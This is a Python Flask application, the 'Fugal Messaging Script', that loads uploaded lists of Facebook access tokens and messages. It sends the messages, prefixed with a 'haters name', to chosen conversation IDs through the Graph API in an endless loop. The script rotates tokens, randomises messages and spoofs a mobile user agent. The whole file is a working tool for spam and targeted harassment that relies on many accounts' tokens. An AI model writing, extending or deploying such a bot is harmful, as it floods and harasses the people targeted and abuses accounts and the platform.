import requests
import time
import sys
import os
from platform import system
import random
from flask import Flask, request, render_template, redirect, url_for
import threading
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configure upload folder
UPLOAD_FOLDER = '/tmp'  # Temporary directory on Render
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_EXTENSIONS = {'txt'}

# ASCII art banner for logs
BANNER = """
=============================================
       Fugal Messaging Script
=============================================
"""

# Global variables to store messaging state
messaging_thread = None
stop_messaging = False

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def liness():
    print('═' * 50)

def send_messages(password, confirm_password, haters_name, convo_ids, speed, message_file_path, token_file_path):
    global stop_messaging
    print(BANNER)

    # Validate configurations
    if not password or password != confirm_password:
        print("[-] Password mismatch or not set!")
        return {"status": "error", "message": "Password mismatch or not set!"}
    print("[+] Password confirmed.")
    liness()

    if not haters_name:
        print("[-] Haters name not set! Using default: Hater")
        haters_name = "Hater"
    print(f"[+] Haters name set to: {haters_name}")
    liness()

    if not convo_ids or not any(convo_ids):
        print("[-] No valid conversation IDs provided!")
        return {"status": "error", "message": "No valid conversation IDs provided!"}
    print(f"[+] Conversation IDs: {', '.join(convo_ids)}")
    liness()

    if not isinstance(speed, int) or speed < 0:
        print("[-] Invalid speed value! Using default: 5 seconds")
        speed = 5
    print(f"[+] Speed set to: {speed} seconds")
    liness()

    if not message_file_path or not os.path.exists(message_file_path):
        print(f"[-] Message file {message_file_path} not found!")
        return {"status": "error", "message": f"Message file {message_file_path} not found!"}
    print(f"[+] Message file: {message_file_path}")
    liness()

    if not token_file_path or not os.path.exists(token_file_path):
        print(f"[-] Token file {token_file_path} not found!")
        return {"status": "error", "message": f"Token file {token_file_path} not found!"}
    print(f"[+] Token file: {token_file_path}")
    liness()

    # Read tokens from token file
    try:
        with open(token_file_path, 'r') as file:
            tokens = file.readlines()
    except FileNotFoundError:
        print(f"[-] Token file {token_file_path} not found!")
        return {"status": "error", "message": f"Token file {token_file_path} not found!"}
    access_tokens = [token.strip() for token in tokens if token.strip()]
    if not access_tokens:
        print(f"[-] No valid tokens in {token_file_path}!")
        return {"status": "error", "message": f"No valid tokens in {token_file_path}!"}
    print(f"[+] Loaded {len(access_tokens)} tokens")
    liness()

    # Read messages from message file
    messages = []
    try:
        with open(message_file_path, 'r') as file:
            file_messages = file.readlines()
            messages.extend([msg.strip() for msg in file_messages if msg.strip()])
    except FileNotFoundError:
        print(f"[-] Message file {message_file_path} not found!")
        return {"status": "error", "message": f"Message file {message_file_path} not found!"}
    if not messages:
        print("[-] No valid messages found!")
        return {"status": "error", "message": "No valid messages found!"}
    print(f"[+] Loaded {len(messages)} messages")
    liness()

    random_messages = True
    requests.packages.urllib3.disable_warnings()

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    num_messages = len(messages)
    max_tokens = min(len(access_tokens), num_messages)

    print("[INFO] Starting Messaging Process")
    liness()

    def getName(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
            return data.get('name', 'Error occurred')
        except:
            return "Error occurred"

    while not stop_messaging:
        try:
            message_list = random.sample(messages, len(messages)) if random_messages else messages
            for message_index in range(num_messages):
                if stop_messaging:
                    break
                token_index = message_index % max_tokens
                access_token = access_tokens[token_index]
                message = message_list[message_index % len(message_list)]
                convo_id = random.choice(convo_ids)

                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
                parameters = {'access_token': access_token, 'message': f"{haters_name} {message}"}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(f"[+] Message {message_index + 1}/{num_messages}")
                    print(f"    Convo ID: {convo_id}")
                    print(f"    Token: {token_index + 1}")
                    print(f"    Message: {haters_name} {message}")
                    print(f"    Time: {current_time}")
                    liness()
                else:
                    print(f"[x] Failed Message {message_index + 1}/{num_messages}")
                    print(f"    Convo ID: {convo_id}")
                    print(f"    Token: {token_index + 1}")
                    print(f"    Message: {haters_name} {message}")
                    print(f"    Time: {current_time}")
                    liness()
                time.sleep(speed)

            if not stop_messaging:
                print("[+] All messages sent. Restarting the process...")
                liness()
        except Exception as e:
            print(f"[!] An error occurred: {e}")
            liness()
            return {"status": "error", "message": f"An error occurred: {e}"}

    return {"status": "success", "message": "Messaging stopped"}

# Flask Routes
@app.route('/', methods=['GET', 'POST'])
def index():
    global messaging_thread, stop_messaging
    error_message = None
    success_message = None

    if request.method == 'POST':
        # Get form data
        password = request.form.get('password')
        confirm_password = request.form.get('confirm_password')
        haters_name = request.form.get('haters_name', 'Hater')
        convo_ids = [cid.strip() for cid in request.form.get('convo_ids', '').split(',') if cid.strip()]
        speed = request.form.get('speed', '5')
        try:
            speed = int(speed)
        except ValueError:
            error_message = "Invalid speed value! Must be a number."
            return render_template('index.html', error=error_message, success=None)

        # Handle file uploads
        message_file = request.files.get('message_file')
        token_file = request.files.get('token_file')

        if not message_file or not token_file:
            error_message = "Both message and token files are required!"
            return render_template('index.html', error=error_message, success=None)

        if not (allowed_file(message_file.filename) and allowed_file(token_file.filename)):
            error_message = "Only .txt files are allowed!"
            return render_template('index.html', error=error_message, success=None)

        # Save uploaded files
        message_filename = secure_filename(message_file.filename)
        token_filename = secure_filename(token_file.filename)
        message_file_path = os.path.join(app.config['UPLOAD_FOLDER'], message_filename)
        token_file_path = os.path.join(app.config['UPLOAD_FOLDER'], token_filename)

        try:
            message_file.save(message_file_path)
            token_file.save(token_file_path)
        except Exception as e:
            error_message = f"Error saving files: {e}"
            return render_template('index.html', error=error_message, success=None)

        # Stop any existing messaging process
        stop_messaging = True
        if messaging_thread and messaging_thread.is_alive():
            messaging_thread.join()

        # Start new messaging process
        stop_messaging = False
        messaging_thread = threading.Thread(
            target=send_messages,
            args=(password, confirm_password, haters_name, convo_ids, speed, message_file_path, token_file_path)
        )
        messaging_thread.start()

        success_message = "Messaging process started!"
        return render_template('index.html', error=None, success=success_message)

    return render_template('index.html', error=None, success=None)

@app.route('/stop', methods=['POST'])
def stop():
    global stop_messaging
    stop_messaging = True
    return redirect(url_for('index'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
